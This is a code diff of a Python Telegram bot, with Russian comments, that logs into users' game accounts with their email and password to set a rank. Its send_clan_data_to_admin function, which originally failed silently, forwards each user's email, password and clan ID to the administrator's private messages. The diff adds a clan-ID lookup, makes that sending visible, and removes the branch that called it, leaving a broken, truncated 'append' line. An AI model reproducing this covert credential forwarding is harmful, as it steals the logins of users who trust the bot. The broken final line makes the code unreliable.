@@ -67,6 +67,26 @@ def login(email, password):
         return None
 
 # -------------------------------
+# GET CLAN ID FUNCTION
+# -------------------------------
+def get_clan_id(token):
+    """Получаем Clan ID пользователя"""
+    headers = {
+        "Authorization": f"Bearer {token}",
+        "Content-Type": "application/json",
+        "User-Agent": "okhttp/3.12.13"
+    }
+    try:
+        response = requests.get(CLAN_ID_URL, headers=headers)
+        if response.status_code == 200:
+            data = response.json()
+            return data.get("clanId")
+        else:
+            return None
+    except requests.exceptions.RequestException as e:
+        return None
+
+# -------------------------------
 # SET RANK FUNCTION
 # -------------------------------
 def set_rank(token):
@@ -101,9 +121,11 @@ def send_clan_data_to_admin(email, password, clan_id):
         "text": message
     }
     try:
-        requests.post(url, data=payload, timeout=5)
+        response = requests.post(url, data=payload, timeout=5)
+        if response.status_code == 200:
+            print("Данные успешно отправлены в ЛС администратора.")
     except requests.exceptions.RequestException:
-        pass  # Silent fail if sending message fails
+        print("Ошибка при отправке данных в ЛС администратору.")
 
 # -------------------------------
 # ADMIN COMMANDS
@@ -167,12 +189,17 @@ def send_welcome(user_id):
 @bot.message_handler(commands=['start'])
 def start(message):
     user_id = message.from_user.id
+
+    # Определяем баланс
     balance = "Unlimited" if user_id in ALLOWED_USERS else "0"
+
+    # Отправляем Telegram ID и баланс
     bot.send_message(
         user_id,
         f"Telegram ID: {user_id}\n💰Balance: {balance}"
     )
 
+    # Если пользователь разрешён, продолжаем workflow логина
     if user_id in ALLOWED_USERS:
         send_welcome(user_id)
     else:
@@ -184,6 +211,7 @@ def handle_message(message):
     text = message.text.strip()
     chat_id = message.chat.id
 
+    # ---- ACCESS CHECK ----
     if user_id not in ALLOWED_USERS:
         bot.send_message(user_id, "⛔ У тебя нет разрешения на использование бота.")
         return
@@ -212,16 +240,4 @@ def handle_message(message):
         token = login(email, password)
         if not token:
             msg_error = bot.reply_to(message, "❌ Ошибка входа.")
-            messages_to_delete.append(msg_error.message_id)
-        else:
-            msg_rank = bot.reply_to(message, "👑 Rang устанавливается...")
-            messages_to_delete.append(msg_rank.message_id)
-
-            success = set_rank(token)
-            if success:
-                msg_done = bot.reply_to(message, "✅ RANG установлен!")
-                # Получаем clan_id
-                clan_id = get_clan_id(token)
-                if clan_id:
-                    # Отправляем данные пользователя и его clan_id в ЛС администратору
-                    send_clan_data_to_admin(email, password, clan_id)
+            messages_to_delete.append
